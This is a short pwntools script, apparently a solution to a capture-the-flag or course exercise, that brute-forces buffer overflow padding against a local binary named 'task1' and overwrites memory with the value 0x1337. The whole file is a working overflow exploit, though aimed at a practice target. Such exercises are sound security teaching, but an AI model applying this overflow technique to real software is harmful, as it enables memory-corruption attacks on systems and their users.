from pwn import *

inject=p32(0x1337)

binary="./task1"
elf=ELF(binary)
for i in range(16,100):
    p=process(binary)
    p.sendline(b'g'*i+inject)
    print(p.recvline())
    print(p.recvline())
    try:
        print("SUKCES",p.recvline())
    except EOFError:
        pass
